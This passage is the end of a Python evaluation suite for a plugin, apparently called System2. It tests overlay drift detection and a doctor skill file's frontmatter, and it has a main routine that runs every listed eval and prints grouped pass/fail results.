    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl020_")
    try:
        project_path = os.path.join(tmp_dir, "empty-project")
        os.makedirs(project_path)
        plugin_root = str(REPO_ROOT / PLUGIN_DIR)

        result = drift_check(plugin_root, project_path)
        if result["status"] != "no_lock":
            errors.append(f"expected status 'no_lock', got {result['status']!r}")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    record(
        "EVAL-OVL-020",
        "drift_check returns 'no_lock' when lock file is absent",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_021():
    """EVAL-OVL-021: doctor skill file exists with correct frontmatter"""
    path = f"{PLUGIN_DIR}/skills/doctor/SKILL.md"
    errors = []
    if not file_exists(path):
        errors.append(f"{path} does not exist")
    else:
        content = read_file(path)
        fm = extract_frontmatter(content)
        if fm is None:
            errors.append("SKILL.md has no YAML frontmatter")
        else:
            if "name: doctor" not in fm:
                errors.append("frontmatter missing 'name: doctor'")
            if "description:" not in fm:
                errors.append("frontmatter missing description")
        if "--doctor" not in content:
            errors.append("SKILL.md does not reference --doctor flag")
        if "read-only" not in content.lower() and "read only" not in content.lower():
            errors.append("SKILL.md should describe the command as read-only")

    record(
        "EVAL-OVL-021",
        "doctor skill file exists with correct frontmatter",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_ovl_022():
    """EVAL-OVL-022: drift_check detects mutated project-local overlay copy"""
    from composer import drift_check

    errors = []
    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl022_")
    try:
        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
        plugin_root = str(REPO_ROOT / PLUGIN_DIR)

        # Mutate a file in the project-local overlay copy.
        local_principles = os.path.join(
            project_path, ".system2", "overlays", "test-overlay",
            "contributions", "orchestrator", "principles.md",
        )
        if not os.path.isfile(local_principles):
            errors.append(f"local principles file not found at {local_principles}")
        else:
            with open(local_principles, "a", encoding="utf-8") as fh:
                fh.write("\n<!-- injected mutation -->")

            result = drift_check(plugin_root, project_path)
            if result["status"] != "stale_overlay":
                errors.append(f"expected status 'stale_overlay', got {result['status']!r}")
            stale_msgs = [d for d in result["details"] if d["type"] == "stale_local"]
            if not stale_msgs:
                errors.append("expected a stale_local detail entry")
            ov_statuses = [o for o in result["overlays"] if o["name"] == "test-overlay"]
            if ov_statuses and ov_statuses[0].get("local_match") is not False:
                errors.append("expected local_match=False on overlay status")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    record(
        "EVAL-OVL-022",
        "drift_check detects mutated project-local overlay copy",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

ALL_EVALS = [
    # Path migration
    eval_path_001,
    eval_path_002,
    eval_path_003,
    eval_path_004,
    eval_path_005,
    # File inventory
    eval_inv_001,
    eval_inv_002,
    eval_inv_003,
    eval_inv_004,
    eval_inv_005,
    # Manifests
    eval_man_001,
    eval_man_002,
    eval_man_003,
    # Template
    eval_tpl_001,
    eval_tpl_002,
    eval_tpl_003,
    # Orchestrator consistency
    eval_orc_001,
    eval_orc_002,
    eval_orc_003,
    # Cleanup
    eval_cln_001,
    eval_cln_002,
    eval_cln_003,
    # Documentation
    eval_doc_001,
    eval_doc_002,
    # Security
    eval_sec_001,
    eval_sec_002,
    eval_sec_003,
    eval_sec_004,
    eval_sec_005,
    eval_sec_006,
    # Maintenance
    eval_maint_001,
    eval_maint_002,
    eval_maint_003,
    # Overlay
    eval_ovl_001,
    eval_ovl_002,
    eval_ovl_003,
    eval_ovl_004,
    eval_ovl_005,
    # Overlay: REQ-OVL-051 regression
    eval_ovl_006,
    # Overlay: conflict detection
    eval_ovl_007,
    eval_ovl_008,
    eval_ovl_009,
    eval_ovl_010,
    eval_ovl_011,
    eval_ovl_012,
    # Overlay: doctor / drift-check
    eval_ovl_013,
    eval_ovl_014,
    eval_ovl_015,
    eval_ovl_016,
    eval_ovl_017,
    eval_ovl_018,
    eval_ovl_019,
    eval_ovl_020,
    eval_ovl_021,
    eval_ovl_022,
]


def main():
    start = time.time()

    print("=" * 70)
    print("System2 Eval Suite")
    print(f"Repo root: {REPO_ROOT}")
    print(f"Goldens:   {GOLDENS_DIR}")
    print("=" * 70)
    print()

    for eval_fn in ALL_EVALS:
        try:
            eval_fn()
        except Exception as e:
            record(
                eval_fn.__doc__.split(":")[0] if eval_fn.__doc__ else eval_fn.__name__,
                f"EXCEPTION in {eval_fn.__name__}",
                False,
                str(e),
            )

    elapsed = time.time() - start

    # Group results by category
    categories = {
        "PATH": "Path Migration",
        "INV": "File Inventory",
        "MAN": "Manifests",
        "TPL": "Template Consistency",
        "ORC": "Orchestrator Consistency",
        "CLN": "Cleanup",
        "DOC": "Documentation",
        "SEC": "Security",
        "MAINT": "Maintenance",
        "OVL": "Overlay",
    }

    passed = sum(1 for r in results if r.passed)
    failed = sum(1 for r in results if not r.passed)

    for prefix, label in categories.items():
        group = [r for r in results if f"-{prefix}-" in r.eval_id]
        if group:
            print(f"--- {label} ---")
            for r in group:
                print(r)
            print()

    # Ungrouped (if any)
    grouped_ids = set()
    for prefix in categories:
        for r in results:
            if f"-{prefix}-" in r.eval_id:
                grouped_ids.add(r.eval_id)
    ungrouped = [r for r in results if r.eval_id not in grouped_ids]
    if ungrouped:
        print("--- Other ---")
        for r in ungrouped:
            print(r)
        print()

    print("=" * 70)
    print(f"Results: {passed} passed, {failed} failed, {len(results)} total")
    print(f"Elapsed: {elapsed:.2f}s")
    print("=" * 70)

    sys.exit(0 if failed == 0 else 1)


if __name__ == "__main__":
    main()
